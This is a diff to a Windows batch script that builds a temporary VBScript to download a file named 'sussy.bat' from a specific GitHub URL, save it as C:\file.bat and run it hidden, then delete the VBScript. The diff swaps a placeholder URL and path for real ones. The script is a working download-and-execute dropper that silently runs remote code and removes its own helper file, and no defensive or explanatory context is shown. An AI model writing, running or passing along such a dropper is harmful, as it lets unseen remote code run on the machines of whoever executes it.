@@ -1,7 +1,7 @@
 @echo off
 echo Set WshShell = CreateObject("WScript.Shell") > %temp%\download.vbs
 echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >> %temp%\download.vbs
-echo objXMLHTTP.open "GET", "https://raw.githubusercontent.com/username/repo/main/file.bat", False >> %temp%\download.vbs
+echo objXMLHTTP.open "GET", "https://github.com/coolst3r/sl/blob/main/sussy.bat", False >> %temp%\download.vbs
 echo objXMLHTTP.send() >> %temp%\download.vbs
 echo If objXMLHTTP.Status = 200 Then >> %temp%\download.vbs
 echo   Set objADOStream = CreateObject("ADODB.Stream") >> %temp%\download.vbs
@@ -10,14 +10,14 @@ echo   objADOStream.Type = 1 >> %temp%\download.vbs
 echo   objADOStream.Write objXMLHTTP.ResponseBody >> %temp%\download.vbs
 echo   objADOStream.Position = 0    'Set the stream position to the start >> %temp%\download.vbs
 echo   Set objFSO = Createobject("Scripting.FileSystemObject") >> %temp%\download.vbs
-echo   If objFSO.Fileexists("C:\path\to\file.bat") Then >> %temp%\download.vbs
-echo     objFSO.DeleteFile "C:\path\to\file.bat" >> %temp%\download.vbs
+echo   If objFSO.Fileexists("C:\file.bat") Then >> %temp%\download.vbs
+echo     objFSO.DeleteFile "C:\file.bat" >> %temp%\download.vbs
 echo   End If >> %temp%\download.vbs
 echo   Set objFSO = Nothing >> %temp%\download.vbs
-echo   objADOStream.SaveToFile "C:\path\to\file.bat" >> %temp%\download.vbs
+echo   objADOStream.SaveToFile "C:\file.bat" >> %temp%\download.vbs
 echo   objADOStream.Close >> %temp%\download.vbs
 echo   Set objADOStream = Nothing >> %temp%\download.vbs
 echo End If >> %temp%\download.vbs
-echo WshShell.Run "C:\path\to\file.bat", 0 >> %temp%\download.vbs
+echo WshShell.Run "C:\file.bat", 0 >> %temp%\download.vbs
 cscript //nologo %temp%\download.vbs
 del %temp%\download.vbs
